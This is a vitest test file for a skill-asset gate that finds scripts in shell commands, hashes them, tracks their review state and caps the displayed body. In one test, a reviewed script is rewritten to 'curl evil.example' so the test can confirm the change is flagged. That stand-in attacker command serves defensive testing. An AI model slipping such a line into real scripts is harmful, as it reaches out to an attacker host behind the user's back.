import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import type { DatabaseSync } from 'node:sqlite'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { SKILL_ASSET_BODY_CAP, skillAssetContextForSegment } from '../skillAssetGate'
import { openDb } from '../../db'
import { recordAssetReviews } from '../../skillAssetReviews'
import { userSkillsDir } from '../../paths'

const SCRIPT = '#!/bin/sh\necho hi\n'

let home: string
let db: DatabaseSync
let cwd: string

function seed(rel: string, body: string): string {
  const abs = path.join(userSkillsDir(home), 'collect-logs', rel)
  fs.mkdirSync(path.dirname(abs), { recursive: true })
  fs.writeFileSync(abs, body)
  return abs
}

function ctxFor(segment: string): ReturnType<typeof skillAssetContextForSegment> {
  return skillAssetContextForSegment({ argusHome: home, db, cwd }, segment)
}

beforeEach(() => {
  home = fs.mkdtempSync(path.join(os.tmpdir(), 'argus-asset-seg-'))
  db = openDb(path.join(home, 'argus.db'))
  cwd = path.join(home, 'cases', 'ACME-1')
  fs.mkdirSync(cwd, { recursive: true })
})
afterEach(() => {
  db.close()
  fs.rmSync(home, { recursive: true, force: true })
})

describe('skillAssetContextForSegment', () => {
  it('finds the script when it is an argument, not the program', () => {
    const abs = seed('scripts/collect.sh', SCRIPT)
    const c = ctxFor(`bash ${abs} --verbose`)
    expect(c).toMatchObject({
      skill: 'collect-logs',
      tier: 'user',
      relPath: 'scripts/collect.sh',
      reviewState: 'unreviewed'
    })
  })

  it('finds the script when it IS the program', () => {
    const abs = seed('scripts/collect.sh', SCRIPT)
    expect(ctxFor(abs)).toMatchObject({ relPath: 'scripts/collect.sh' })
  })

  it('resolves a relative token against the given cwd', () => {
    seed('scripts/collect.sh', SCRIPT)
    const rel = path.relative(
      cwd,
      path.join(userSkillsDir(home), 'collect-logs/scripts/collect.sh')
    )
    expect(ctxFor(`sh ${rel}`)).toMatchObject({ relPath: 'scripts/collect.sh' })
  })

  it('strips surrounding quotes from a token', () => {
    const abs = seed('scripts/collect.sh', SCRIPT)
    expect(ctxFor(`bash "${abs}"`)).toMatchObject({ relPath: 'scripts/collect.sh' })
  })

  it('skips leading VAR=value assignments', () => {
    const abs = seed('scripts/collect.sh', SCRIPT)
    expect(ctxFor(`LOG=1 bash ${abs}`)).toMatchObject({ relPath: 'scripts/collect.sh' })
  })

  it('reports reviewed when the bytes match a recorded row', () => {
    const abs = seed('scripts/collect.sh', SCRIPT)
    recordAssetReviews(db, 'collect-logs', [{ relPath: 'scripts/collect.sh', content: SCRIPT }], {
      origin: 'proposal',
      reviewedBy: 'Jiawei Han'
    })
    expect(ctxFor(`bash ${abs}`)).toMatchObject({ reviewState: 'reviewed' })
  })

  it('reports changed when the file was edited after review', () => {
    const abs = seed('scripts/collect.sh', SCRIPT)
    recordAssetReviews(db, 'collect-logs', [{ relPath: 'scripts/collect.sh', content: SCRIPT }], {
      origin: 'proposal',
      reviewedBy: null
    })
    fs.writeFileSync(abs, '#!/bin/sh\ncurl evil.example\n')
    const c = ctxFor(`bash ${abs}`)
    expect(c).toMatchObject({ reviewState: 'changed' })
    // The card shows the bytes about to run, not the reviewed ones — those are not stored.
    expect(c?.body).toContain('curl evil.example')
  })

  it('hashes the current bytes, and the hash changes with them', () => {
    const abs = seed('scripts/collect.sh', SCRIPT)
    const before = ctxFor(`bash ${abs}`)!.hash
    fs.writeFileSync(abs, `${SCRIPT}# one more line\n`)
    expect(ctxFor(`bash ${abs}`)!.hash).not.toBe(before)
  })

  it('ignores a non-executable sibling', () => {
    const abs = seed('templates/report.md', '# Report\n')
    expect(ctxFor(`cat ${abs}`)).toBeNull()
  })

  it('treats a shebang file as executable whatever its name', () => {
    const abs = seed('templates/hook.md', SCRIPT)
    expect(ctxFor(`bash ${abs}`)).toMatchObject({ relPath: 'templates/hook.md' })
  })

  it('ignores a token that is not under a skills root', () => {
    const abs = path.join(cwd, 'evidence', 'x.sh')
    fs.mkdirSync(path.dirname(abs), { recursive: true })
    fs.writeFileSync(abs, SCRIPT)
    expect(ctxFor(`bash ${abs}`)).toBeNull()
  })

  it('ignores a directory and a missing file', () => {
    seed('scripts/collect.sh', SCRIPT)
    expect(ctxFor(`ls ${path.join(userSkillsDir(home), 'collect-logs', 'scripts')}`)).toBeNull()
    expect(ctxFor(`bash ${path.join(userSkillsDir(home), 'collect-logs', 'ghost.sh')}`)).toBeNull()
  })

  it('returns null for an ordinary command', () => {
    expect(ctxFor('git log --oneline')).toBeNull()
  })

  it('caps the body and reports the byte counts', () => {
    const big = `#!/bin/sh\n${'x'.repeat(SKILL_ASSET_BODY_CAP + 500)}\n`
    const abs = seed('scripts/big.sh', big)
    const c = ctxFor(`bash ${abs}`)!
    expect(Buffer.byteLength(c.body, 'utf8')).toBe(SKILL_ASSET_BODY_CAP)
    expect(c.bodyBytesTotal).toBe(Buffer.byteLength(big, 'utf8'))
    expect(c.bodyBytesOmitted).toBe(c.bodyBytesTotal - SKILL_ASSET_BODY_CAP)
  })

  it('reports zero omitted bytes for a body under the cap', () => {
    const abs = seed('scripts/collect.sh', SCRIPT)
    const c = ctxFor(`bash ${abs}`)!
    expect(c.body).toBe(SCRIPT)
    expect(c.bodyBytesOmitted).toBe(0)
    expect(c.bodyBytesTotal).toBe(Buffer.byteLength(SCRIPT, 'utf8'))
  })

  it('keeps the body byte-accurate when a multi-byte codepoint straddles the cap boundary', () => {
    // A 4-byte UTF-8 codepoint (an emoji) placed so its bytes span indices
    // [SKILL_ASSET_BODY_CAP - 2, SKILL_ASSET_BODY_CAP + 1] — two bytes fall inside the cap,
    // two fall outside, so a naive `subarray(0, CAP)` cuts the sequence in half.
    const prefixLen = SKILL_ASSET_BODY_CAP - 2
    const prefix = 'x'.repeat(prefixLen)
    const emoji = '\u{1F600}' // 4 bytes in utf8
    const suffix = 'y'.repeat(20)
    const big = prefix + emoji + suffix
    const abs = seed('scripts/multibyte.sh', big)
    const c = ctxFor(`bash ${abs}`)!
    expect(c.bodyBytesTotal).toBe(Buffer.byteLength(big, 'utf8'))
    expect(Buffer.byteLength(c.body, 'utf8')).toBe(c.bodyBytesTotal - c.bodyBytesOmitted)
    expect(c.body).not.toContain('�')
  })
})
